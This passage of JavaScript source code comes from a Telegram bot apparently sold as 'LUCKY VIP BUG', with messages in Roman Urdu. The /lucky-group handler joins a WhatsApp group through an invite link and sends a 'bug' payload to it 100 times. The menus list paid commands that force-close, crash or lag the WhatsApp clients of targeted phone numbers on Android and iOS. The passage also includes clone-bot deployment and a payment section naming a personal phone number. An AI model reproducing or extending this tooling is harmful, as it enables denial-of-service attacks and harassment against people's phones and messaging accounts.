              BOT_OWNER_OVERRIDE: String(ownerIdArg),
              BOT_DB_DIR: cloneDbDir,
            },
            silent: true,
            cwd: process.cwd(),
          });

          cloneProcess.stderr && cloneProcess.stderr.on("data", (d) => {
            log.error(`Clone ${deployId}: ${d}`);
          });

          cloneProcess.on("exit", (code) => {
            log.warning(`Clone bot ${deployId} exited with code ${code}`);
          });

          clonesDb.bots.push({
            id: deployId,
            token,
            ownerId: String(ownerIdArg),
            botName: botInfo.first_name,
            botUsername: botInfo.username,
            deployedBy: userId,
            pid: cloneProcess.pid,
            createdAt: new Date().toISOString(),
          });
          saveClonesDb(clonesDb);

          await ctx.reply(
            `✅ Bot kamyabi se deploy ho gaya!\n\n` +
            `🤖 Bot: @${botInfo.username}\n` +
            `🆔 Deploy Key: ${deployId}\n` +
            `⚙️ PID: ${cloneProcess.pid}\n\n` +
            `Ab @${botInfo.username} pe /start bhejein!`
          );

        } catch (e) {
          log.error(`Deploy failed: ${e.message}`);
          await ctx.reply(`❌ Deploy fail ho gaya: ${e.message}`);
        }
        break;
      }

                  // ─── /mybots — Apne deployed clones dekho ────────────────────────
      case "mybots": {
        const clonesDb = loadClonesDb();
        const mine = isOwner(userId)
          ? clonesDb.bots
          : clonesDb.bots.filter((b) => b.deployedBy === userId);

        if (mine.length === 0) return ctx.reply("📭 Koi bot deploy nahi hua.");

        const lines = mine.map(
          (b) => `🆔 \`${b.id}\` — Owner: \`${b.ownerId}\` — PID: ${b.pid}`
        );
        await ctx.reply(`🤖 *Deployed Bots:*\n\n${lines.join("\n")}`, { parse_mode: "Markdown" });
        break;
      }

      // ─── /stopbot <deploy_id> — Clone bot band karo ───────────────────
      case "stopbot": {
        const deployId = args[0];
        if (!deployId) return ctx.reply("🖥 *Format:* `/stopbot <deploy_id>`", { parse_mode: "Markdown" });

        const clonesDb = loadClonesDb();
        const idx = clonesDb.bots.findIndex((b) => b.id === deployId);
        if (idx === -1) return ctx.reply("❌ Deploy ID nahi mila!");

        const entry = clonesDb.bots[idx];
        if (!isOwner(userId) && entry.deployedBy !== userId)
          return ctx.reply("❌ Yeh bot aapne deploy nahi kiya!");

        try { process.kill(entry.pid, "SIGTERM"); } catch (_) {}
        try { fs.rmSync(entry.dir, { recursive: true, force: true }); } catch (_) {}

        clonesDb.bots.splice(idx, 1);
        saveClonesDb(clonesDb);

        await ctx.reply(`🛑 Bot \`${deployId}\` band kar diya gaya.`, { parse_mode: "Markdown" });
        break;
      }

      // ─── /setgroupsender — Group ka shared WA sender set karo ──────
      case "setgroupsender": {
        if (!isGroup) return ctx.reply("❌ Yeh command sirf group mein use hoti hai!");

        const chatId = String(ctx.chat.id);
        const waEntry = waClients[userId];

        if (!waEntry || waEntry.status !== "open" || !waEntry.sock) {
          return ctx.reply(
            "❌ Tumhara WhatsApp connected nahi hai!\n\n" +
            "Pehle private chat mein /reqpair se apna number pair karo, phir yeh command use karo."
          );
        }

        const senders = loadGroupSenders();
        senders[chatId] = userId;
        saveGroupSenders(senders);

        // Group automatically approve ho jaye jab koi sender set kare
        if (!isGroupApproved(chatId)) {
          const groups = loadApprovedGroups();
          groups[chatId] = { approvedBy: userId, approvedAt: new Date().toISOString(), autoApproved: true };
          saveApprovedGroups(groups);
        }

        const uname = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
        await ctx.reply(
          `✅ Group Sender Set Ho Gaya!\n\n` +
          `👤 Sender: ${uname}\n` +
          `📱 Ab is group ke sab members bugs bhej sakte hain\n\n` +
          `Sender hatane ke liye: /removegroupsender`
        );
        break;
      }

      // ─── /removegroupsender — Group sender hata do ───────────────────
      case "removegroupsender": {
        if (!isGroup) return ctx.reply("❌ Yeh command sirf group mein use hoti hai!");

        const chatId = String(ctx.chat.id);
        const senders = loadGroupSenders();

        if (!senders[chatId]) return ctx.reply("⚠️ Is group ka koi sender set nahi hai.");

        // Sirf owner, reseller, ya jo sender hai woh hata sake
        if (!isOwner(userId) && !isReseller(userId) && senders[chatId] !== userId) {
          return ctx.reply("❌ Sirf owner, reseller ya khud sender hata sakta hai!");
        }

        delete senders[chatId];
        saveGroupSenders(senders);
        await ctx.reply("🗑 Group sender hata diya gaya. Ab har member ko apna WA pair karna hoga.");
        break;
      }

      // ─── /groupsender — Current sender check karo ────────────────────
      case "groupsender": {
        if (!isGroup) return ctx.reply("❌ Yeh command sirf group mein use hoti hai!");
        const chatId = String(ctx.chat.id);
        const senders = loadGroupSenders();
        const senderUid = senders[chatId];
        if (!senderUid) return ctx.reply("⚠️ Is group ka koi shared sender set nahi.\n\n/setgroupsender use karo apna WA pair karke.");
        const isConnected = waClients[senderUid]?.status === "open";
        await ctx.reply(
          `📡 *Group Sender Info*\n\n` +
          `🆔 Sender ID: \`${senderUid}\`\n` +
          `🔌 Status: ${isConnected ? "✅ Connected" : "❌ Disconnected"}\n\n` +
          `${isConnected ? "Sab members bugs bhej sakte hain!" : "⚠️ Sender offline hai — kisi aur ko /setgroupsender karna hoga."}`,
          { parse_mode: "Markdown" }
        );
        break;
      }

      // ─── /approvegroup <chatId> — Owner group approve kare ──────────
      case "approvegroup": {
        if (!isOwner(userId)) return ctx.reply("❌ Sirf owner!");
        const chatId = args[0];
        if (!chatId) return ctx.reply("Format: /approvegroup <chatId>");
        if (isGroupApproved(chatId)) return ctx.reply("⚠️ Pehle se approved!");
        const groups = loadApprovedGroups();
        groups[chatId] = { approvedBy: userId, approvedAt: new Date().toISOString() };
        saveApprovedGroups(groups);
        await ctx.reply(`✅ Group \`${chatId}\` approve ho gaya!`, { parse_mode: "Markdown" });
        try {
          await bot.api.sendMessage(chatId, "✅ *Group Approved!*\n\n𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ab active hai! /start karo.", { parse_mode: "Markdown" });
        } catch (_) {}
        break;
      }

      // ─── /rejectgroup <chatId> — Owner group reject kare ─────────────
      case "rejectgroup": {
        if (!isOwner(userId)) return ctx.reply("❌ Sirf owner!");
        const chatId = args[0];
        if (!chatId) return ctx.reply("Format: /rejectgroup <chatId>");
        const groups = loadApprovedGroups();
        delete groups[chatId];
        saveApprovedGroups(groups);
        await ctx.reply(`🗑 Group \`${chatId}\` reject/remove kar diya.`, { parse_mode: "Markdown" });
        try {
          await bot.api.sendMessage(chatId, "❌ Group approval hata di gayi. @luckyhackr se contact karein.");
          await bot.api.leaveChat(chatId);
        } catch (_) {}
        break;
      }

      // ─── /approvedgroups — Approved groups ki list ────────────────────
      case "approvedgroups": {
        if (!isOwner(userId)) return ctx.reply("❌ Sirf owner!");
        const groups = loadApprovedGroups();
        const keys = Object.keys(groups);
        if (keys.length === 0) return ctx.reply("📭 Koi approved group nahi.");
        const lines = keys.map((id) => `• \`${id}\``);
        await ctx.reply(`✅ *Approved Groups (${keys.length}):*\n\n${lines.join("\n")}`, { parse_mode: "Markdown" });
        break;
      }

      case "lucky-group": {
        try {
            const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");
            if (cooldownCheck.onCooldown) {
                return ctx.reply(`⏳ Thoda wait karo ❮${cooldownCheck.remaining}❯ second, phir /lucky-group dobara chalao.`);
            }
            cooldownModule.updateCooldown(userId, "delay");

            const text = ctx.message.text || "";
            const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);

            if (!inviteCodeMatch) {
                return ctx.reply(
                    "<b>CMD ERROR</b>\n" +
                    "Sahi tarika:\n" +
                    "<code>/lucky-group https://chat.whatsapp.com/InviteLink</code>",
                    { parse_mode: "HTML" }
                );
            }

            const inviteCode = inviteCodeMatch[1];
            let target = null;

            const waResult = getWAClient(userId, ctx.chat.id, isGroup);
            if (!waResult) {
                const groupHint = isGroup
                  ? "\n\nGroup mein koi /setgroupsender kare ya /reqpair se apna number pair karo."
                  : "\n\nApna number /reqpair se pair karo.";
                return ctx.reply(
                    "<b>WHATSAPP CONNECTED NAHI HAI.</b>\n" +
                    "Pehle pair karo:\n" +
                    "<code>/reqpair 923xxxx</code>" + groupHint,
                    { parse_mode: "HTML" }
                );
            }
            const client = waResult.client;

            // Step 1: Pehle check karo bot already group mein hai ya nahi
            // (privacy check bypass — agar already member hai to join ki zaroorat nahi)
            try {
                const chats = await client.groupFetchAllParticipating();
                if (chats) {
                    for (const [groupId, groupData] of Object.entries(chats)) {
                        // Invite code se match karo
                        if (groupData?.inviteCode === inviteCode) {
                            target = groupId;
                            break;
                        }
                        // Group ID mein inviteCode included ho
                        if (groupId.includes(inviteCode)) {
                            target = groupId;
                            break;
                        }
                    }
                }
            } catch (_) {}

            // Step 2: Agar bot already group mein hai - groupGetInviteInfo se ID nikalo
            if (!target) {
                try {
                    const groupInfo = await client.groupGetInviteInfo(inviteCode);
                    if (groupInfo && groupInfo.id) {
                        // Check if bot is already member
                        const chats = await client.groupFetchAllParticipating().catch(() => null);
                        if (chats && chats[groupInfo.id]) {
                            // Bot pehle se member hai — seedha use karo
                            target = groupInfo.id;
                        } else {
                            // Bot member nahi — join karo
                            try {
                                const joined = await client.groupAcceptInvite(inviteCode);
                                target = joined || groupInfo.id;
                            } catch (joinErr) {
                                const errStr = String(joinErr);
                                // 409 = already member
                                if (joinErr.status === 409 || errStr.includes("conflict")) {
                                    target = joinErr.context?.jid || joinErr.jid || groupInfo.id;
                                } else {
                                    // Join fail hua par groupInfo mila tha — phir bhi try karo
                                    target = groupInfo.id;
                                }
                            }
                        }
                    }
                } catch (infoErr) {
                    // groupGetInviteInfo bhi fail — directly join try karo
                    try {
                        const forced = await client.groupAcceptInvite(inviteCode);
                        if (forced) target = forced;
                    } catch (forceErr) {
                        if (forceErr.context?.jid) target = forceErr.context.jid;
                        if (forceErr.status === 409 || String(forceErr).includes("conflict")) {
                            target = forceErr.context?.jid || forceErr.jid;
                        }
                    }
                }
            }

            if (!target) {
                return ctx.reply("❌ Group ID nahi mila. Invite link check karo — expired ya bot banned ho sakta hai.");
            }

            const imageMenu = config.thumburl;

            // Telegram pe status message bhejo
            let sent;
            for (let attempt = 0; attempt < 3; attempt++) {
                try {
                    sent = await ctx.replyWithPhoto(imageMenu, {
                        caption:
                            "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                            `👤 <b>target :</b> <code>WA Group</code>\n` +
                            `🎭 <b>type bug:</b> <code>Delay (Group)</code>\n` +
                            "📊 <b>status:</b> <code>🦠 Bug bheja ja raha hai...</code>\n\n" +
                            `<b>📞 Support</b>\nMadad ke liye @luckyhackr se contact karo`,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [[
                                { text: "📢 CHANNEL", url: "https://t.me/lucky_vipbug" },
                                { text: "👤 OWNER", url: "https://t.me/luckyhackr" },
                            ]],
                        },
                    });
                    break;
                } catch (e) {
                    if (e.parameters?.retry_after) {
                        await new Promise(r => setTimeout(r, e.parameters.retry_after * 1000));
                    } else if ((String(e).includes("rate") || String(e).includes("overlimit")) && attempt < 2) {
                        await new Promise(r => setTimeout(r, 5000));
                    } else { throw e; }
                }
            }

            // Bug bhejo group mein
            (async () => {
                for (let z = 0; z < 100; z++) {
                    try {
                await BlankV1(client, target);
                        await new Promise(r => setTimeout(r, 3500));
                    } catch (execErr) {
                        await new Promise(r => setTimeout(r, 5000));
                    }
                }

                // Status update karo
                await new Promise(r => setTimeout(r, 2000));
                if (sent && sent.message_id) {
                    for (let attempt = 0; attempt < 3; attempt++) {
                        try {
                            await ctx.api.editMessageCaption(ctx.chat.id, sent.message_id, {
                                caption:
                                    "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                                    `👤 <b>target :</b> <code>WA Group</code>\n` +
                                    `🎭 <b>type bug:</b> <code>Delay (Group)</code>\n` +
                                    "📊 <b>status:</b> <code>🦠 Kamyabi se bhej diya!</code>\n\n" +
                                    `<b>📞 Support</b>\nMadad ke liye @luckyhackr se contact karo`,
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [[
                                        { text: "📢 CHANNEL", url: "https://t.me/lucky_vipbug" },
                                        { text: "👤 OWNER", url: "https://t.me/luckyhackr" },
                                    ]],
                                },
                            });
                            break;
                        } catch (e) {
                            if (e.parameters?.retry_after) {
                                await new Promise(r => setTimeout(r, e.parameters.retry_after * 1000));
                            } else if ((String(e).includes("rate") || String(e).includes("overlimit")) && attempt < 2) {
                                await new Promise(r => setTimeout(r, 5000));
                            } else { break; }
                        }
                    }
                }
            })();

        } catch (e) {
            log.error(`BUG ERROR: ${e.message}`);
            await ctx.reply("❌ Bug chalate waqt kharabi aayi. Dobara try karo.");
        }
        break;
      }

      default:
        log.warning(`Unknown command: ${command}`);
    }
  } catch (err) {
    log.error(`An Error Occurred: ${err.message}`);
    try {
      await bot.api.sendMessage(
        config.ownerId,
        `An error occurred: ${err.message}`,
        {
          parse_mode: "Markdown",
        }
      );
    } catch {}
  }
});

// ─── Bot group mein add hone ka handler ────────────────────────────────────
bot.on("my_chat_member", async (ctx) => {
  try {
    const newStatus = ctx.myChatMember?.new_chat_member?.status;
    const chat = ctx.chat;
    if (!chat || (chat.type !== "group" && chat.type !== "supergroup")) return;
    if (newStatus !== "administrator" && newStatus !== "member") return;

    const addedBy = ctx.myChatMember?.from;
    const chatId = String(chat.id);
    const groupTitle = chat.title || "Unknown Group";
    const adderName = addedBy?.username ? `@${addedBy.username}` : addedBy?.first_name || "Unknown";
    const adderPremium = hasAccess(String(addedBy?.id)) || isReseller(String(addedBy?.id)) || isOwner(String(addedBy?.id));

    // Agar pehle se approved hai — kuch na karo
    if (isGroupApproved(chatId)) return;

    // Owner ko approval request bhejo
    const approveKeyboard = new InlineKeyboard()
      .text("✅ Approve", `grp_approve_${chatId}`)
      .text("❌ Reject", `grp_reject_${chatId}`);

    await bot.api.sendMessage(
      config.ownerId,
      `🔔 *Naya Group Request!*\n\n` +
      `📋 Group: *${groupTitle}*\n` +
      `🆔 Chat ID: \`${chatId}\`\n` +
      `👤 Add kiya: ${adderName} (\`${addedBy?.id}\`)\n` +
      `💎 Premium: ${adderPremium ? "✅ Hai" : "❌ Nahi"}\n\n` +
      `Bot ko approve karo tab tak group mein kaam nahi karega.`,
      { parse_mode: "Markdown", reply_markup: approveKeyboard }
    );

    // Group ko batao ke approval pending hai
    await ctx.api.sendMessage(
      chat.id,
      `⏳ *𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚*\n\n` +
      `Bot is group mein add ho gaya!\n` +
      `Owner se approval pending hai — approve hone ke baad kaam shuru karega.\n\n` +
      `Premium lene ke liye: @luckyhackr`,
      { parse_mode: "Markdown" }
    );
  } catch (e) {
    log.error(`my_chat_member error: ${e.message}`);
  }
});

// ─── Owner: Group Approve ──────────────────────────────────────────────────
bot.callbackQuery(/^grp_approve_(.+)$/, async (ctx) => {
  try {
    if (!isOwner(ctx.from.id.toString())) return ctx.answerCallbackQuery("❌ Sirf owner!");
    const chatId = ctx.match[1];
    if (isGroupApproved(chatId)) return ctx.answerCallbackQuery("⚠️ Pehle se approved hai!");

    const groups = loadApprovedGroups();
    groups[chatId] = {
      approvedBy: ctx.from.id,
      approvedAt: new Date().toISOString(),
    };
    saveApprovedGroups(groups);

    await ctx.editMessageText(
      ctx.message.text + "\n\n✅ *APPROVED* — Group active ho gaya!",
      { parse_mode: "Markdown" }
    );
    await ctx.answerCallbackQuery("✅ Group approve ho gaya!");

    // Group ko notify karo
    try {
      await bot.api.sendMessage(
        chatId,
        `✅ *Group Approved!*\n\n` +
        `𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ab is group mein active hai!\n` +
        `/start karo menu dekhne ke liye.`,
        { parse_mode: "Markdown" }
      );
    } catch (_) {}
  } catch (e) { log.error(`grp_approve error: ${e.message}`); }
});

// ─── Owner: Group Reject ───────────────────────────────────────────────────
bot.callbackQuery(/^grp_reject_(.+)$/, async (ctx) => {
  try {
    if (!isOwner(ctx.from.id.toString())) return ctx.answerCallbackQuery("❌ Sirf owner!");
    const chatId = ctx.match[1];

    await ctx.editMessageText(
      ctx.message.text + "\n\n❌ *REJECTED*",
      { parse_mode: "Markdown" }
    );
    await ctx.answerCallbackQuery("❌ Group reject kar diya!");

    // Group ko notify + bot leave karo
    try {
      await bot.api.sendMessage(
        chatId,
        `❌ *Group Approved Nahi Hua*\n\nOwner ne is group ko approve nahi kiya.\nPremium lene ke liye: @luckyhackr`,
        { parse_mode: "Markdown" }
      );
      await bot.api.leaveChat(chatId);
    } catch (_) {}
  } catch (e) { log.error(`grp_reject error: ${e.message}`); }
});
// ───────────────────────────────────────────────────────────────────────────

bot.callbackQuery("open_allaccess", async (ctx) => {
  try {
    await ctx.answerCallbackQuery({ text: "🔑 Opening Access Panel...", show_alert: false });

    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  🔐 <b>OWNER ACCESS PANEL</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User :</b> <code>${userDisplay}</code>
⚙️ <b>Dev  :</b> @luckyhackr
🕒 <b>Up   :</b> ${uptime}
💾 <b>RAM  :</b> ${usedMemory} MB

┌─────────────────────┐
│  📋 <b>OWNER COMMANDS</b>   │
└─────────────────────┘
┃ ▸ /clearsesi   — Clear Session
┃ ▸ /reqpair     — Request Pair
┃ ▸ /broadcast   — Broadcast Msg
┃ ▸ /checkbio    — Check Bio
┃ ▸ /listpair    — List Senders
┃ ▸ /addacces    — Add Access
┃ ▸ /address     — Set Address
┃ ▸ /delacces    — Del Access
┃ ▸ /listaccess  — List Access
┃ ▸ /cdon        — Cooldown ON
┃ ▸ /cdoff       — Cooldown OFF
┃ ▸ /setcd       — Set Cooldown
┃ ▸ /ref         — Referral Link
┃ ▸ /refstats    — Referral Stats
┃ ▸ /setreflimit — Invite Limit Set

━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${CHANNEL_ID.replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("𝗕𝗨𝗚 𝗗𝗘𝗟𝗔𝗬", "bug_spam")
  .text("𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘", "bug_crash")
  .row()
  .text("« 𝗕𝗔𝗖𝗞", "back_to_main");

    const imageMenu = config.thumburl;

    const loadingMsg = await ctx.reply("⏳ *BILAL\\-BUG\\-VIP Menu loading\\.\\.\\.*", { parse_mode: "MarkdownV2" });
    try { await ctx.deleteMessage(); } catch (_) {}
    if (imageMenu) {
      await ctx.replyWithPhoto(imageMenu, { caption, parse_mode: "HTML", reply_markup: keyboard });
    } else {
      await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }
    try { await ctx.api.deleteMessage(ctx.chat.id, loadingMsg.message_id); } catch (_) {}
  } catch (error) {
    log.error(`Error in open_allmenu: ${error.message}`);
    await ctx
      .answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true })
      .catch(() => {});
  }
});

bot.callbackQuery("open_allmenu", async (ctx) => {
  try {
    await ctx.answerCallbackQuery({ text: "⚡ Loading Bug Menu...", show_alert: false });

    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  ⚡ <b>𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 — MENU</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User :</b> <code>${userDisplay}</code>
⚙️ <b>Dev  :</b> @luckyhackr
🕒 <b>Up   :</b> ${uptime}
💾 <b>RAM  :</b> ${usedMemory} MB

┌─────────────────────┐
│  🗂️ <b>SELECT CATEGORY</b>   │
└─────────────────────┘
┃ 🔴 Force Close  → Button Below
┃ 🟡 Delay Bug    → Button Below

━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${CHANNEL_ID.replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("𝗕𝗨𝗚 𝗗𝗘𝗟𝗔𝗬", "bug_spam")
  .text("𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗢𝗦𝗘", "bug_crash")
  .row()
  .text("« 𝗕𝗔𝗖𝗞", "back_to_main");

    const imageMenu = config.thumburl;

    const loadingMsg = await ctx.reply("⏳ *BILAL\\-BUG\\-VIP Menu loading\\.\\.\\.*", { parse_mode: "MarkdownV2" });
    try { await ctx.deleteMessage(); } catch (_) {}
    if (imageMenu) {
      await ctx.replyWithPhoto(imageMenu, { caption, parse_mode: "HTML", reply_markup: keyboard });
    } else {
      await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }
    try { await ctx.api.deleteMessage(ctx.chat.id, loadingMsg.message_id); } catch (_) {}
  } catch (error) {
    log.error(`Error in open_allmenu: ${error.message}`);
    await ctx
      .answerCallbackQuery({ text: "❌ Error", show_alert: true })
      .catch(() => {});
  }
});

bot.callbackQuery("bug_crash", async (ctx) => {
  try {
    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    await ctx.answerCallbackQuery({ text: "🔴 Loading Crash Menu...", show_alert: false });

    const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  🔴 <b>FORCE CLOSE MENU</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User :</b> <code>${userDisplay}</code>
⚙️ <b>Dev  :</b> @luckyhackr
🕒 <b>Up   :</b> ${uptime}
💾 <b>RAM  :</b> ${usedMemory} MB

┌─────────────────────┐
│  💥 <b>CRASH COMMANDS</b>    │
└─────────────────────┘
┃ ▸ /lucky-ui <code>number</code>
┃   Android blank+UI visible

┃ ▸ /lucky-efcenew <code>number</code>
┃   FC andro invisible (stable)

┃ ▸ /lucky-godbye <code>number</code>
┃   FC andro invisible (beta)

┃ ▸ /lucky-fccombo <code>number</code>
┃   FC andro infinity (stable)

┃ ▸ /lucky-fcbeta <code>number</code>
┃   FC 1 msg (beta support)

┃ ▸ /lucky-ios <code>number</code>
┃   iPhone crash

━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${CHANNEL_ID.replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("𝗔𝗟𝗟 𝗠𝗘𝗡𝗨", "open_allmenu")
  .row()
  .text("💳 Payment ki Tafseel", "show_payment")
  .row()
  .text("« 𝗕𝗔𝗖𝗞", "back_to_main");
    const imageMenu = config.thumburl;
    const loadingMsg = await ctx.reply("⏳ *BILAL\\-BUG\\-VIP Menu loading\\.\\.\\.*", { parse_mode: "MarkdownV2" });
    try { await ctx.deleteMessage(); } catch (_) {}
    if (imageMenu) {
      await ctx.replyWithPhoto(imageMenu, { caption, parse_mode: "HTML", reply_markup: keyboard });
    } else {
      await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }
    try { await ctx.api.deleteMessage(ctx.chat.id, loadingMsg.message_id); } catch (_) {}
  } catch (error) {
    log.error(`Error in bug_crash: ${error.message}`);
  }
});

bot.callbackQuery("bug_spam", async (ctx) => {
  try {
    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    await ctx.answerCallbackQuery({ text: "🟡 Loading Delay Menu...", show_alert: false });

    const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  🟡 <b>DELAY / SPAM MENU</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User :</b> <code>${userDisplay}</code>
⚙️ <b>Dev  :</b> @luckyhackr
🕒 <b>Up   :</b> ${uptime}
💾 <b>RAM  :</b> ${usedMemory} MB

┌─────────────────────┐
│  🐌 <b>DELAY COMMANDS</b>    │
└─────────────────────┘
┃ ▸ /lucky-delaynew <code>number</code>
┃   Android delayed

┃ ▸ /lucky-beta <code>number</code>
┃   Android delay beta

┃ ▸ /lucky-buldozer <code>number</code>
┃   Android suck up quota

┃ ▸ /lucky-goodbye <code>number</code>
┃   Android delay new

┃ ▸ /lucky-delayneww <code>number</code>
┃   Android delay new v2

┃ ▸ /lucky-pending <code>number</code>
┃   Android stuck message

┃ ▸ /lucky-king <code>number</code>
┃   Android delay message

┃ ▸ /lucky-iosking <code>number</code>
┃   iOS stuck message

┃ ▸ /lucky-iosnew <code>number</code>
┃   iOS stuck message v2

┃ ▸ /crashcall <code>number</code>
┃   Force Close Call

━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${CHANNEL_ID.replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("𝗔𝗟𝗟 𝗠𝗘𝗡𝗨", "open_allmenu")
  .row()
  .text("💳 Payment ki Tafseel", "show_payment")
  .row()
  .text("« 𝗕𝗔𝗖𝗞", "back_to_main");

    try { await ctx.deleteMessage(); } catch (_) {}
    const thumbFile = "./storage/thumbnail.jpg";
    if (fs.existsSync(thumbFile)) {
      await ctx.replyWithPhoto(new InputFile(thumbFile), { caption, parse_mode: "HTML", reply_markup: keyboard });
    } else {
      await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }
  } catch (error) {
    log.error(`Error in bug_spam: ${error.message}`);
  }
});
bot.callbackQuery("back_to_main", async (ctx) => {
  try {
    await ctx.answerCallbackQuery({ text: "🏠 Main Menu khul raha hai...", show_alert: false });

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  ⚡ <b>𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 SYSTEM</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

👤 <b>User  :</b> <code>${username}</code>
⚙️ <b>Dev   :</b> @luckyhackr
🕒 <b>Uptime:</b> ${uptime}
💾 <b>RAM   :</b> ${usedMemory} MB

┌─────────────────────┐
│  🚀 <b>Main Navigation</b>       │
└─────────────────────┘
┃ 🗂️  Bug Menu    → MENU BUG
┃ 🔐  Owner Panel → OWNER BUG

━━━━━━━━━━━━━━━━━━━━━━━
📢 <a href="https://t.me/${CHANNEL_ID.replace("@", "")}">Official Channel</a>  •  📞 @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("𝗠𝗘𝗡𝗨 𝗕𝗨𝗚", "open_allmenu")
  .text("𝗢𝗪𝗡𝗘𝗥 𝗕𝗨𝗚", "open_allaccess")
  .row()
  .text("💳 Payment ki Tafseel", "show_payment")
  .row()
  .url("𝗖𝗛𝗔𝗡𝗡𝗘𝗟", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

    const imageMenu = config.thumburl;

    const loadingMsg = await ctx.reply("⏳ *BILAL\\-BUG\\-VIP Menu loading\\.\\.\\.*", { parse_mode: "MarkdownV2" });
    try { await ctx.deleteMessage(); } catch (_) {}
    if (imageMenu) {
      await ctx.replyWithPhoto(imageMenu, { caption, parse_mode: "HTML", reply_markup: keyboard });
    } else {
      await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }
    try { await ctx.api.deleteMessage(ctx.chat.id, loadingMsg.message_id); } catch (_) {}
  } catch (error) {
    log.error(`Error in back_to_main: ${error.message}`);
  }
});

// ─── Payment Info Callback ────────────────────────────────────────────────────
bot.callbackQuery("show_payment", async (ctx) => {
  try {
    await ctx.answerCallbackQuery({ text: "💳 Payment ki Tafseel...", show_alert: false });

    const caption = `<blockquote>
╔━━━━━━━━━━━━━━━━━━━━━╗
  💳 <b>Payment ki Tafseel</b>
╚━━━━━━━━━━━━━━━━━━━━━╝

┌─────────────────────┐
│  📦 <b>Premium Packages</b>      │
└─────────────────────┘
┃ 🥈 Basic     — 1 Hafta
┃ 🥇 Standard  — 1 Mahina
┃ 💎 Pro       — 3 Mahine

┌─────────────────────┐
│  🏦 <b>Payment Methods</b>       │
└─────────────────────┘
┃ 📱 <b>JazzCash</b>
┃    Number: <code>03254368438</code>
┃     Name: <SAMEEN BIBI>
┃ 
┌─────────────────────┐
│  📋 <b>Hidayaat</b>            │
└─────────────────────┘
┃ ➊ Payment karein
┃ ➋ Screenshot lein
┃ ➌ @luckyhackr ko bhejein
┃ ➍ 5 minute mein active ho jayega

━━━━━━━━━━━━━━━━━━━━━━━
📞 <b>Support:</b> @luckyhackr
━━━━━━━━━━━━━━━━━━━━━━━</blockquote>`.trim();

